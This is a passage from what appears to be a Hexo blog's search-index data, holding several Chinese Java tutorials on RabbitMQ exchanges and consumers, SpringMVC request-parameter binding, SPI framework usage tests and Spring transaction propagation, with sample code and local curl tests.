MsgConsumer.consumerMsg(exchangeName, queueName, routingKey); } catch (IOException e) { e.printStackTrace(); } catch (TimeoutException e) { e.printStackTrace(); } } public static void main(String[] args) throws InterruptedException { DirectConsumer consumer = new DirectConsumer(); String[] routingKey = new String[]{\"aaa\", \"bbb\"}; String[] queueNames = new String[]{\"qa\", \"qb\"}; for (int i = 0; i &lt; 2; i++) { consumer.msgConsumer(queueNames[i], routingKey[i]); } Thread.sleep(1000 * 60 * 10); }} 执行上面的代码之后，就会多两个Queue，且增加了Exchange到Queue的绑定 当上面两个代码配合起来使用时，就可以看到对于消费者而言，qa一直消费的是偶数，qb一直消费的是奇数，一次输出如下: 12345678[qa] Waiting for message. To exist press CTRL+C[qb] Waiting for message. To exist press CTRL+C [qa] Received 'hello &gt;&gt;&gt; 0 [qb] Received 'hello &gt;&gt;&gt; 1 [qa] Received 'hello &gt;&gt;&gt; 2 [qb] Received 'hello &gt;&gt;&gt; 3 [qa] Received 'hello &gt;&gt;&gt; 4... 3. Fanout方式有了上面的case之后，这个的实现和测试就比较简单了 a. Producer1234567891011121314151617181920212223public class FanoutProducer { private static final String EXCHANGE_NAME = \"fanout.exchange\"; public void publishMsg(String routingKey, String msg) { try { MsgProducer.publishMsg(EXCHANGE_NAME, BuiltinExchangeType.FANOUT, routingKey, msg); } catch (Exception e) { e.printStackTrace(); } } public static void main(String[] args) { FanoutProducer directProducer = new FanoutProducer(); String[] routingKey = new String[]{\"aaa\", \"bbb\"}; String msg = \"hello &gt;&gt;&gt; \"; for (int i = 0; i &lt; 30; i++) { directProducer.publishMsg(routingKey[i % 2], msg + i); } System.out.println(\"----over-------\"); }} b. consumer1234567891011121314151617181920212223public class FanoutProducer { private static final String EXCHANGE_NAME = \"fanout.exchange\"; public void publishMsg(String routingKey, String msg) { try { MsgProducer.publishMsg(EXCHANGE_NAME, BuiltinExchangeType.FANOUT, routingKey, msg); } catch (Exception e) { e.printStackTrace(); } } public static void main(String[] args) { FanoutProducer directProducer = new FanoutProducer(); String[] routingKey = new String[]{\"aaa\", \"bbb\"}; String msg = \"hello &gt;&gt;&gt; \"; for (int i = 0; i &lt; 30; i++) { directProducer.publishMsg(routingKey[i % 2], msg + i); } System.out.println(\"----over-------\"); }} 这个的输出就比较有意思了，fa,fb两个队列都可以接收到发布的消息，而且单独的执行一次上面的投递数据之后，发现fa/fb两个队列的数据都是30条 然后消费的结果如下 12345678910111213[qa] Waiting for message. To exist press CTRL+C[qb] Waiting for message. To exist press CTRL+C [qa] Received 'hello &gt;&gt;&gt; 0 [qb] Received 'hello &gt;&gt;&gt; 0 [qa] Received 'hello &gt;&gt;&gt; 1 [qb] Received 'hello &gt;&gt;&gt; 1 [qb] Received 'hello &gt;&gt;&gt; 2 [qa] Received 'hello &gt;&gt;&gt; 2 [qa] Received 'hello &gt;&gt;&gt; 3 [qb] Received 'hello &gt;&gt;&gt; 3 [qb] Received 'hello &gt;&gt;&gt; 4 [qa] Received 'hello &gt;&gt;&gt; 4 ... 4. Topic方式代码和上面差不多，就不重复拷贝了，接下来卡另外几个问题 III. 基础进阶在上面的基础使用中，会有几个疑问如下： Exchange声明的问题（是否必须声明，如果不声明会怎样） Exchange声明的几个参数（durable, autoDelete)有啥区别 当没有队列和Exchange绑定时，直接往队列中塞数据，好像不会有数据增加（即先塞数据，然后创建queue，建立绑定，从控制台上看这个queue里面也不会有数据） 消息消费的两种姿势（一个主动去拿数据，一个是rabbit推数据）对比 ack/nack怎么用，nack之后消息可以怎么处理 以上内容，留待下一篇进行讲解 IV. 其他1. 相关博文 《RabbitMq基础教程之安装与测试》 《RabbitMq基础教程之基本概念》 2. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 3. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 4. 扫描关注","link":"/hexblog/2018/05/27/RabbitMQ基础教程之基本使用篇/"},{"title":"RabbitMQ基础教程之基于配置的消费者实现","text":"RabbitMQ基础教程之基于配置的消费者实现相关博文，推荐查看: RabbitMq基础教程之安装与测试 RabbitMq基础教程之基本概念 RabbitMQ基础教程之基本使用篇 RabbitMQ基础教程之使用进阶篇 RabbitMQ基础教程之Spring&amp;JavaConfig使用篇 RabbitMQ基础教程之Spring-JavaConfig-FactoryBean使用姿势 前面一篇介绍了使用工厂方式创建消费者，其中一个不太友好的地方就在配置都是硬编码的方式，不太灵活，那么是否可以结合前一篇的FactoryBean来实现从配置中来灵活的创建消费者呢？ I. 动态配置实现消费者程序1. 配置文件加载首先就是需要从配置文件中获取相应的配置信息，借助JavaConfig，加一个注解即可 1234567891011121314151617181920212223@Configuration@PropertySource(\"classpath:dynamicConfig.properties\")public class DynSpringConfig { @Autowired private Environment environment; @Bean public ConnectionFactory connectionFactory() { CachingConnectionFactory factory = new CachingConnectionFactory(); factory.setHost(environment.getProperty(\"dyn.mq.host\")); factory.setPort(Integer.parseInt(environment.getProperty(\"dyn.mq.port\"))); factory.setUsername(environment.getProperty(\"dyn.mq.uname\")); factory.setPassword(environment.getProperty(\"dyn.mq.pwd\")); factory.setVirtualHost(environment.getProperty(\"dyn.mq.vhost\")); return factory; } @Bean public RabbitAdmin rabbitAdmin(ConnectionFactory connectionFactory) { return new RabbitAdmin(connectionFactory); }} 主要就是 @PropertySource(&quot;classpath:dynamicConfig.properties&quot;) ， 表示从dynamicConfig.properties文件中读取相应的配置，而这些配置，会存放在 Environment 容器内； 获取配置的方式，就是通过org.springframework.core.env.PropertyResolver#getProperty(java.lang.String)获取 2. 消费者通用实现实现一个简单的通用的消费端，主要根据前一篇博文中定义的MQContainerFactory，来生成SimpleMessageListenerContainer，然后注入消费服务，并启动容器 1234567891011121314public class DynamicConsumer { public DynamicConsumer(MQContainerFactory fac) throws Exception { SimpleMessageListenerContainer container = fac.getObject(); container.setMessageListener(new AbsMQConsumer() { @Override public boolean process(Message message, Channel channel) { System.out.println(\"DynamicConsumer: \" + fac.getQueue() + \" | \" + new String(message.getBody())); return true; } }); container.start(); }} 上面是一个非常简单的实现，针对常见的的RabbitMQ消息消费而言，也可以写一个泛型类，然后借助Spring的事件机制，实现一个通用的消费端，一种case如下: 1234567891011121314151617public class JsonMsgConsumer { public JsonMsgConsumer(ApplicationContext apc, MQContainerFactory fac, Class&lt;?&gt; msgType) throws Exception { SimpleMessageListenerContainer container = fac.getObject(); container.setMessageListener(new AbsMQConsumer() { @Override public boolean process(Message message, Channel channel) { System.out.println(\"DynamicConsumer: \" + fac.getQueue() + \" | \" + new String(message.getBody())); Object type = JSONObject.parseObject(message.getBody(), msgType); apc.publishEvent(type); return true; } }); container.start(); }} 如果message中的数据，是通过Json序列化方式存入，则使用方，只需要监听对应的Event消费数据即可，完全不用再关系消费端的情况了 3. MQContainerFactory 初始化根据配置文件中的信息，初始化factory，这个可谓是最关键的地方了，实现也和之前大致类似，只不过是将硬编码改成配置信息读取而已，完整的配置文件如下 12345678910111213141516171819202122232425262728293031323334353637383940414243@Configuration@PropertySource(\"classpath:dynamicConfig.properties\")public class DynSpringConfig { @Autowired private Environment environment; @Bean public ConnectionFactory connectionFactory() { CachingConnectionFactory factory = new CachingConnectionFactory(); factory.setHost(environment.getProperty(\"dyn.mq.host\")); factory.setPort(Integer.parseInt(environment.getProperty(\"dyn.mq.port\"))); factory.setUsername(environment.getProperty(\"dyn.mq.uname\")); factory.setPassword(environment.getProperty(\"dyn.mq.pwd\")); factory.setVirtualHost(environment.getProperty(\"dyn.mq.vhost\")); return factory; } @Bean public RabbitAdmin rabbitAdmin(ConnectionFactory connectionFactory) { return new RabbitAdmin(connectionFactory); } @Bean public AmqpProducer amqpProducer() { return new AmqpProducer(); } @Bean public DynamicConsumer dynamicConsumer(ConnectionFactory connectionFactory, RabbitAdmin rabbitAdmin) throws Exception { MQContainerFactory fac = MQContainerFactory.builder().directExchange(environment.getProperty(\"dyn.mq.exchange\")) .queue(environment.getProperty(\"dyn.mq.queue\")) .autoDeleted(Boolean.parseBoolean(environment.getProperty(\"dyn.mq.autoDeleted\"))) .autoAck(Boolean.parseBoolean(environment.getProperty(\"dyn.mq.autoAck\"))) .durable(Boolean.parseBoolean(environment.getProperty(\"dyn.mq.durable\"))) .routingKey(environment.getProperty(\"dyn.mq.routingKey\")).rabbitAdmin(rabbitAdmin) .connectionFactory(connectionFactory).build(); return new DynamicConsumer(fac); }} 4. 测试配置文件内容： 1234567891011dyn.mq.host=127.0.0.1dyn.mq.port=5672dyn.mq.uname=admindyn.mq.pwd=admindyn.mq.vhost=/dyn.mq.exchange=fac.direct.exchangedyn.mq.queue=dyn.queuedyn.mq.durable=truedyn.mq.autoDeleted=falsedyn.mq.autoAck=falsedyn.mq.routingKey=fac-routing 测试方法 123456789101112131415161718@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(classes = DynSpringConfig.class)public class DynamicConsumerUnit { @Autowired private AmqpProducer amqpProducer; @Test public void testDirectConsumer() throws InterruptedException { String[] routingKey = new String[]{\"hello.world\", \"fac-routing\", \"test1\"}; for (int i = 0; i &lt; 100; i++) { amqpProducer.publishMsg(\"fac.direct.exchange\", routingKey[i % 3], \"&gt;&gt;&gt; hello \" + routingKey[i % 3] + \"&gt;&gt;&gt; \" + i); } System.out.println(\"-------over---------\"); Thread.sleep(1000 * 60 * 10); }} 执行之后，就可以看到正常的消费了 5. 扩充与小结看完之后，可能有一个问题，为什么要这样做，好处是什么？ 大部分的时候，从MQ获取消息的逻辑都一样，唯一的区别在于获取到数据之后做的业务而言，如果把这一块完全的抽象出来，通过配置的方式，那么额外的新增mq的消费，就不需要再改消费端的代码了，然后就会有一个疑问，上面的配置文件中，生成dynamicConsumer的bean不也是需要额外写么？ 如果将配置信息，以某种数组的方式定义，遍历读取这些配置，然后创建多个DynamicConsuer实例，是否就能支持动态扩展呢？ 将配置改成下面的进行尝试 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@Configuration@PropertySource(\"classpath:dynamicConfig.properties\")public class DynSpringConfig { @Autowired private Environment environment; @Bean public ConnectionFactory connectionFactory() { CachingConnectionFactory factory = new CachingConnectionFactory(); factory.setHost(environment.getProperty(\"dyn.mq.host\")); factory.setPort(Integer.parseInt(environment.getProperty(\"dyn.mq.port\"))); factory.setUsername(environment.getProperty(\"dyn.mq.uname\")); factory.setPassword(environment.getProperty(\"dyn.mq.pwd\")); factory.setVirtualHost(environment.getProperty(\"dyn.mq.vhost\")); return factory; } @Bean public RabbitAdmin rabbitAdmin(ConnectionFactory connectionFactory) { return new RabbitAdmin(connectionFactory); } @Bean public AmqpProducer amqpProducer() { return new AmqpProducer(); } @Autowired private ConnectionFactory connectionFactory; @PostConstruct public void dynamicConsumer() throws Exception { RabbitAdmin rabbitAdmin = new RabbitAdmin(connectionFactory); MQContainerFactory fac = MQContainerFactory.builder().directExchange(environment.getProperty(\"dyn.mq.exchange\")) .queue(environment.getProperty(\"dyn.mq.queue\")) .autoDeleted(Boolean.parseBoolean(environment.getProperty(\"dyn.mq.autoDeleted\"))) .autoAck(Boolean.parseBoolean(environment.getProperty(\"dyn.mq.autoAck\"))) .durable(Boolean.parseBoolean(environment.getProperty(\"dyn.mq.durable\"))) .routingKey(environment.getProperty(\"dyn.mq.routingKey\")).rabbitAdmin(rabbitAdmin) .connectionFactory(connectionFactory).build(); new DynamicConsumer(fac); }} 注意之前 dynamicConsumer 是bean的创建，改成了初始化一个实例，如果配置文件是数组，内部用一个遍历就可以全部加载，现在就需要验证上面的配置改动之后，是否依然可以消费数据 实测ok，部分输出如下 1234-------over---------DynamicConsumer: dyn.queue | &gt;&gt;&gt; hello fac-routing&gt;&gt;&gt; 1DynamicConsumer: dyn.queue | &gt;&gt;&gt; hello fac-routing&gt;&gt;&gt; 4DynamicConsumer: dyn.queue | &gt;&gt;&gt; hello fac-routing&gt;&gt;&gt; 7 II. 其他项目地址 六月/study-demo 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/06/05/RabbitMQ基础教程之基于配置的消费者实现/"},{"title":"SpringMVC之请求参数的获取方式","text":"SpringMVC之请求参数的获取方式 常见的一个web服务，如何获取请求参数？ 一般最常见的请求为GET和POST，get请求的参数在url上可以获取，post请求参数除了url上还有可能在表单中，文件上传时，获取方式又和一般的参数获取不一样 本篇则主要集中在不同请求方式下，获取参数的使用姿势 首先需要搭建一个后端的请求，为了快速演示 利用spring-boot创建了一个机器简单的工程，依赖版本 1.5.4.RELEASE I. GET请求参数获取get请求参数，一般都是直接挂在请求的url上，所以获取这些参数还是比较简单的 1. 通过 HttpServletRequest获取参数这个可以说是最基本最常见的的方式了，javax.servlet.ServletRequest#getParameter 来获取对应的参数，下面各处一个实例 1234567891011@RestController@RequestMapping(path = \"webs/demo\")public class DemoController { @RequestMapping(path = \"req1\") public String req1(HttpServletRequest request) { String user = request.getParameter(\"user\"); String password = request.getParameter(\"password\"); return \"req1 user: \" + user + \" pwd: \" + password; }} 根据上面暴露的接口，我们测试的case就很简单了 12345http://127.0.0.1:8080/webs/demo/req1?user=小灰灰Blog&amp;password=123456## 输出 req1 user: 小灰灰Blog pwd: 123456http://127.0.0.1:8080/webs/demo/req1?user=小灰灰Blog## 输出 req1 user: 小灰灰Blog pwd: null 说明 这是一个最基本的获取参数的方式，get，post请求都适用的，通常在filter,intercepter中也是可以通过HttpServletRequest对象来获取请求参数 除了获取常见的请求参数之外，HttpServletRequest可以获取请求头的完整信息 在一次请求的生命周期内，可以通过下面的方式获取Request对象(当然也可以获取response对象) 12HttpServletRequest httpServletRequest = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest(); 2. 直接方法参数获取直接给出case, 这个方法依然是放在上面的DemoController下面的 1234@RequestMapping(path = \"req2\")public String req2(String user, String password) { return \"req2 user: \" + user + \" pwd: \" + password;} 请求验证 12345678910http://127.0.0.1:8080/webs/demo/req2?user=%E5%B0%8F%E7%81%B0%E7%81%B0Blog&amp;password=123456## 输出： req2 user: 小灰灰Blog pwd: 123456http://127.0.0.1:8080/webs/demo/req2?password=123456## 输出： req2 user: null pwd: 123456http://127.0.0.1:8080/webs/demo/req2?password=123456&amp;User=blog## 输出： req2 user: null pwd: 123456 注意： 上面这种使用方式，相当于直接将url参数映射到了Controller方法的参数上了 方法参数名必须和url参数名完全一致（区分大小写） 顺序无关 若参数没传，则默认为null 一个疑问 上面的demo中Controller的方法参数都是String还好，如果将password改成int，会出现什么情况 代码稍作修改 1234@RequestMapping(path = \"req2\")public String req2(String user, int password) { return \"req2 user: \" + user + \" pwd: \" + password;} 实际测试 12345678910111213# case1 http://127.0.0.1:8080/webs/demo/req2?password=123456&amp;user=blog## 输出： req2 user: blog pwd: 123456# case 2http://127.0.0.1:8080/webs/demo/req2?password2=123456&amp;user=blog## 输出: 报错, Optional int parameter 'password' is present but cannot be translated into a null value due to being declared as a primitive type. Consider declaring it as object wrapper for the corresponding primitive type# case 3http://127.0.0.1:8080/webs/demo/req2?password=abc&amp;user=blog## 输出：报错, \"Failed to convert value of type 'java.lang.String' to required type 'int'; nested exception is java.lang.NumberFormatException: For input string: \"abc\"\" 结果说明 如果请求参数与方法参数类型不一致，会抛出转换异常 如果方法参数为非封装基本类型，则url参数必须存在，否则报错 3. RequestParam注解方式获取请求参数通过@RequestParam注解获取参数的方式和上面的一种比较类似，case如下 12345@RequestMapping(path = \"req3\", method = RequestMethod.GET)public String req3(@RequestParam(\"user\") String username, @RequestParam(\"password\") String pwd) { return \"req3 user: \" + username + \" pwd: \" + pwd;} 测试case 12345678# case1 http://127.0.0.1:8080/webs/demo/req3?password=123456&amp;user=blog## 输出: req3 user: blog pwd: 123456# case2http://127.0.0.1:8080/webs/demo/req3?password=123456## 输出：报错， Required String parameter 'user' is not presen 说明 不指定注解的name或value属性时，等同于第二种使用姿势 注解的name属性或value属性，用实际的参数名来指定 controller的参数名与url参数名没有强关联（区别第二种方式） 参数类型需要保证一致（通第二种方式） 如果url参数可选，请设置require属性为false，如下1@RequestParam(name = \"user\", required = false) String username 4. Bean方式获取参数对于请求参数比较复杂的情况下，我比较喜欢这种使用姿势，管理起来方便简单 12345678910@Datapublic static class UserDO { String user; String password;}@RequestMapping(path = \"req4\", method = RequestMethod.GET)public String req4(UserDO userDO) { return \"req4 userDO: \" + userDO;} 测试case 12345678# case1http://127.0.0.1:8080/webs/demo/req4?password=123456&amp;user=%E5%B0%8F%E7%81%B0%E7%81%B0Blog## 输出: req4 userDO: DemoController.UserDO(user=小灰灰Blog, password=123456)# case2http://127.0.0.1:8080/webs/demo/req4?password=123456## 输出: req4 userDO: DemoController.UserDO(user=null, password=123456) 说明 定义一个bean，内部属性和请求参数对应 允许参数不存在的情况，会使用null代替（所以，尽量不要使用非封装基本类型，否则参数不传时，会抛异常） bean的属性，可以根据实际情况指定类型 5. ModelAttribute注解方式@ModelAttribute注解的方法，会优于Controller之前执行，一般更常见于向视图传输数据使用，此处不详细展开，正常来讲，专门的获取参数不太会用这这种方式来玩 6. Path参数Path参数，专指的是请求路径的参数，如 1http://127.0.0.1:8080/webs/demo/req4?password=123456 上面这个url中，password是我们传统意义上的请求参数，其中path参数则是指其中 req4, demo这种path路径中的一环；对此，最常见的一个case就是常见的博客中,如开源中国的一个博客链接 1https://my.oschina.net/u/566591/blog/1601400 566591 : 这个参数主要用来区分用户 1601400 : 这个参数则主要是表示对应的博文 一般path参数的获取方式如下 1234@RequestMapping(path = \"req6/{user}/info\")public String req6(@PathVariable(name = \"user\") String user) { return \"req6 user: \" + user;} 测试case 1234567891011# case1 http://127.0.0.1:8080/webs/demo/req6/blog/info?user=haha## 输出：req6 user: blog# case2http://127.0.0.1:8080/webs/demo/req6/blog?user=haha## 输出: 404# case3http://127.0.0.1:8080/webs/demo/req6/info?user=haha## 输出: 404 注意: path参数的使用，需要确保参数存在且类型匹配 path参数和url参数不会相互影响 II. POST请求参数获取POST请求参数，更多的是看提交表单参数是否可以获取到，以及如何获取，主要的手段依然是上面几种方式，下面验证下是否ok 1. HttpServletRequest方式获取参数测试case，可以借助curl来实现post请求 123456789101112# case1 curl -d \"user=小灰灰Blog&amp;password=123456\" \"http://127.0.0.1:8080/webs/demo/req1\"## 输出： req1 user: 小灰灰Blog pwd: 123456# case2curl -d \"user=小灰灰Blog\" \"http://127.0.0.1:8080/webs/demo/req1?password=123456\"## 输出：req1 user: 小灰灰Blog pwd: 12345# case3curl -d \"user=小灰灰Blog\" \"http://127.0.0.1:8080/webs/demo/req1?user=greyBlog\"## 输出：req1 user: greyBlog pwd: null curl也可以换成js请求测试方式 1234567891011var formData = new FormData();formData.append(\"user\", \"小灰灰Blog\");$.ajax({ url: 'http://127.0.0.1:8080/webs/demo/req1?password=123456', type: 'post', cache: false, data: formData, processData: false, contentType: false}); 说明 对于HttpServletReuqest方式获取参数时，get和post没什么区别 若url参数和表单参数同名了，测试结果显示使用的是url参数（待确认，当然最好不要这么干） 2. 方法参数获取几个测试demo如下 12345678910111213# case 1curl -d \"user=小灰灰Blog&amp;password=123456\" \"http://127.0.0.1:8080/webs/demo/req2\"## 输出： req2 user: 小灰灰Blog pwd: 123456# case 2curl -d \"password=123456\" \"http://127.0.0.1:8080/webs/demo/req2\"## 输出：req2 user: null pwd: 123456# case 3curl -d \"password=123456\" \"http://127.0.0.1:8080/webs/demo/req2?user=blog\"## 输出： req2 user: blog pwd: 123456 基本上使用姿势和get没什么区别 3. RequestParam注解方式12345678910111213# case 1curl -d \"password=123456&amp;user=blog\" \"http://127.0.0.1:8080/webs/demo/req3\"## 输出： req3 user: blog pwd: 123456# case 2curl -d \"password=123456\" \"http://127.0.0.1:8080/webs/demo/req3?user=blog\"## 输出： req3 user: blog pwd: 123456# case 3curl -d \"password=123456&amp;user=blog\" \"http://127.0.0.1:8080/webs/demo/req3?password=900\"## 输出：req3 user: blog pwd: 900,123456 注意 和前面的两种方式不同的是，当post表单的参数和url参数同名时，会合并成一个字符串 4. Bean方式12345678910111213## case1 curl -d \"password=123456&amp;user=blog\" \"http://127.0.0.1:8080/webs/demo/req4?password=900\"## 输出 req4 userDO: DemoController.UserDO(user=blog, password=900,123456)## case2curl -d \"password=123456&amp;user=blog\" \"http://127.0.0.1:8080/webs/demo/req4\"## 输出 req4 userDO: DemoController.UserDO(user=blog, password=123456)## case3curl -d \"password=123456\" \"http://127.0.0.1:8080/webs/demo/req4\"## 输出 req4 userDO: DemoController.UserDO(user=null, password=123456) 这种方式不区分get,post，所以完全复杂的交互接口，完全可以考虑用bean的方式来定义请求参数 5. PathVariable这个没法玩… III. 多媒体上传参数获取 上传文件的支持，对于传统的spring-mvc来说，可能需要一些添加一些相关配置，不在本文的范畴内，下面默认已经配置好 1. 实例支持1234567891011121314@RequestMapping(path = {\"wx/upload\", \"wx/wx/upload\"}, method = {RequestMethod.GET, RequestMethod.POST, RequestMethod.OPTIONS})@ResponseBodypublic String upload(HttpServletRequest request) { MultipartFile file = null; if (request instanceof MultipartHttpServletRequest) { file = ((MultipartHttpServletRequest) request).getFile(\"image\"); } if (file == null) { throw new IllegalArgumentException(\"图片不能为空!\"); } return \"success\";} 简单来说，主要是利用HttpServletRequest来获取上传的文件 注意： 如果接口必须要求上传文件，可以直接把参数声明为 MultipartHttpServletRequest， 此时调用方如果不传参数，会被异常拦截（可以通过@ControllerAdvice来拦截全局异常） 如果可以不上传文件，则可以用上面的这种猥琐姿势，内部进行判断 ((MultipartHttpServletRequest) request).getFile(xxx)来获取指定名的上传文件 IV. 小结1. 五种获取参数的姿势 方式 注意事项 HttpServletRequest获取参数 最常见通用 方法参数与请求参数同名 注意参数名统一，注意类型一致，尽量不用非包装基本类型 @RequestParam注解 同上，可注解内指定http参数名 Bean方式 定义一个bean，会将同名的http参数赋值进去，推荐 @PathVariable 注解 请求url参数 2. 传文件使用姿势使用MultipartHttpServletRequest来获取上传的文件，当然也可以获取基本的请求参数 V. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/01/04/SpringMVC之请求参数的获取方式/"},{"title":"4. SPI框架实现之旅四：使用测试","text":"使用测试 前面三篇主要是介绍如何设计的，如何实现的，这一篇，则主要集中在如何使用。实现得再好，如果不好用，也白搭 本篇介绍几个简单的使用case，包括静态使用，动态适配，自定义选择器等 1. 简单的静态使用定义一个SPI接口 IPrint, 两个实现 FilePrint, ConsolePrint 123456789101112131415161718@Spipublic interface IPrint { void print(String str);}public class FilePrint implements IPrint { @Override public void print(String str) { System.out.println(\"file print: \" + str); }}public class ConsolePrint implements IPrint { @Override public void print(String str) { System.out.println(\"console print: \" + str); }} 添加配置文件 com.hust.hui.quicksilver.spi.test.print.IPrint, 内容如下 com.hust.hui.quicksilver.spi.test.print.ConsolePrint com.hust.hui.quicksilver.spi.test.print.FilePrint 测试代码如下 1234567891011121314151617181920212223242526272829@Testpublic void testPrint() throws NoSpiMatchException { SpiLoader&lt;IPrint&gt; spiLoader = SpiLoader.load(IPrint.class); IPrint print = spiLoader.getService(&quot;ConsolePrint&quot;); print.print(&quot;console----&gt;&quot;); print = spiLoader.getService(&quot;FilePrint&quot;); print.print(&quot;file----&gt;&quot;); try { print = spiLoader.getService(&quot;undefine&quot;); print.print(&quot;undefine----&quot;); Assert.assertTrue(false); } catch (Exception e) { System.out.println(&quot;type error--&gt;&quot; + e); } try { print = spiLoader.getService(123); print.print(&quot;type error----&quot;); Assert.assertTrue(false); } catch (Exception e){ System.out.println(&quot;type error--&gt;&quot; + e); }} 输出如下 1234console print: console----&gt;file print: file----&gt;type error--&gt;com.hust.hui.quicksilver.spi.exception.NoSpiMatchException: no spiImpl match the name you choose! your choose is: undefinetype error--&gt;java.lang.IllegalArgumentException: conf spiInterfaceType should be sub class of [class java.lang.String] but yours:class java.lang.Integer 演示如下 2. 动态适配与静态的使用有点区别，主要的区别点在于接口的定义（需要注意第一个参数是作为选择器选择SPI实现的参数），同样是上面这个spi接口 123456789101112131415161718192021222324252627282930313233@Spipublic interface IPrint { void print(String str); void adaptivePrint(String conf, String str);} @Override public void print(String str) { System.out.println(\"file print: \" + str); } @Override public void adaptivePrint(String conf, String str) { System.out.println(\"file adaptivePrint: \" + str); }}public class ConsolePrint implements IPrint { @Override public void print(String str) { System.out.println(\"console print: \" + str); } @Override public void adaptivePrint(String conf, String str) { System.out.println(\"console adaptivePrint: \" + str); }} 主要是新增了一个接口 adaptivePrint, 其他的没有啥区别，测试代码如下 12345678@Testpublic void testAdaptivePrint() throws SpiProxyCompileException { IPrint print = SpiLoader.load(IPrint.class).getAdaptive(); print.adaptivePrint(\"FilePrint\", \"[file print]\"); print.adaptivePrint(\"ConsolePrint\", \"[console print]\");} 输出结果 1234567891011121314151617181920212223242526file adaptivePrint: [file print]console adaptivePrint: [console print]``` 演示图 ![http://s2.mogucdn.com/mlcdn/c45406/170531_54f638fkcl58c6lihl92adei31c78_1222x718.gif](http://s2.mogucdn.com/mlcdn/c45406/170531_54f638fkcl58c6lihl92adei31c78_1222x718.gif)## 3. 自定义选择器&gt; 上面两个很简单的演示了下使用方式，最基本的方法， 没有加上 @SpiConf 注解， 没有显示指定选择器类型，下面则演示下，如何自定义选择器**SPI接口**有一个欢迎方法，我们需求根据用户的来源显示不同的欢迎至此， 下面定义了一个 `UserSelector`选择器，这个就是我们自定义的选择器```java@Spipublic interface IUser { @SpiAdaptive(selector = UserSelector.class) void welcome(UserDO userDO);} spi实现类 123456789101112131415public class QQUser implements IUser { @Override public void welcome(UserDO userDO) { System.out.println(\"qq 欢迎你! \" + userDO); }}public class WeixinUser implements IUser { @Override public void welcome(UserDO userDO) { System.out.println(\"weixin 欢迎你! \" + userDO); }} META-INF/services/ 目录下的配置如下 com.hust.hui.quicksilver.spi.def.spi.IUser com.hust.hui.quicksilver.spi.def.spi.QQUser com.hust.hui.quicksilver.spi.def.spi.WeixinUser 选择器实现如下 12345678910111213141516171819public class UserSelector implements ISelector&lt;UserDO&gt; { @Override public &lt;K&gt; K selector(Map&lt;String, SpiImplWrapper&lt;K&gt;&gt; map, UserDO conf) throws NoSpiMatchException { if (conf == null || conf.getMarket() == null) { throw new IllegalArgumentException(\"userDo or userDO#market should not be null!\"); } String name = conf.getMarket().getName(); if (map.containsKey(name)) { return map.get(name).getSpiImpl(); } throw new NoSpiMatchException(\"no spiImp matched marked: \" + conf.getMarket()); }} 从上面的选择器逻辑可以看出，我们是根据 UserDO的market参数来进行选择的， UserDO的定义如下 12345678910111213141516171819202122232425262728@Getter@Setter@ToStringpublic class UserDO { private String uname; private String avatar; private MarketEnum market;}public enum MarketEnum { WEIXIN(\"WeixinUser\"), QQ(\"QQUser\"); private String name; MarketEnum(String name) { this.name = name; } public String getName() { return name; }} 测试代码如下 123456789101112131415161718192021@Testpublic void testUserSPI() throws SpiProxyCompileException { SpiLoader&lt;IUser&gt; loader = SpiLoader.load(IUser.class); IUser user = loader.getAdaptive(); UserDO weixinUser = new UserDO(); weixinUser.setAvatar(\"weixin.avatar.jpg\"); weixinUser.setUname(\"微信用户\"); weixinUser.setMarket(MarketEnum.WEIXIN); user.welcome(weixinUser); UserDO qqUser = new UserDO(); qqUser.setAvatar(\"qq.avatar.jpg\"); qqUser.setUname(\"qq用户\"); qqUser.setMarket(MarketEnum.QQ); user.welcome(qqUser); System.out.println(\"-----over------\");} 输出结果: weixin 欢迎你! UserDO(uname=微信用户, avatar=weixin.avatar.jpg, market=WEIXIN) qq 欢迎你! UserDO(uname=qq用户, avatar=qq.avatar.jpg, market=QQ) 演示如下: 3. 其他博客系列链接： SPI框架实现之旅四：使用测试 SPI框架实现之旅三：实现说明 SPI框架实现之旅二：整体设计 SPI框架实现之旅一：背景介绍 项目: QuickAlarm 项目地址： Quick-SPI 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注","link":"/hexblog/2017/05/30/SPI框架实现之旅四：使用测试/"},{"title":"Spring学习之事务管理与传播属性","text":"Spring 事务管理与传播属性在博文 《Spring学习之事务的使用姿势》 中，演示了基于注解和xml的事务使用姿势，以@Transactional注解为例，其中很多的参数都没有详细说明 本篇博文，则主要目的是弄懂这些参数有啥用，以及在实际项目中如何选择 I. 事务的传播属性1. @Transactional注解实际使用的case 123456789101112@Transactional(propagation = Propagation.REQUIRED, isolation = Isolation.DEFAULT, readOnly = false)public void transfor(final int inUserId, final int outUserId, final int payMoney, final int status) { MoneyEntity entity = moneyDao.queryMoney(outUserId); if (entity.getMoney() &gt; payMoney) { // 可以转账 // 先减钱 moneyDao.incrementMoney(outUserId, -payMoney); // 再加钱 moneyDao.incrementMoney(inUserId, payMoney); System.out.println(\"转账完成! now: \" + System.currentTimeMillis()); }} 接下来看下注解的源码定义 1234567891011121314151617181920212223public @interface Transactional { @AliasFor(\"transactionManager\") String value() default \"\"; @AliasFor(\"value\") String transactionManager() default \"\"; Propagation propagation() default Propagation.REQUIRED; Isolation isolation() default Isolation.DEFAULT; int timeout() default -1; boolean readOnly() default false; Class&lt;? extends Throwable&gt;[] rollbackFor() default {}; 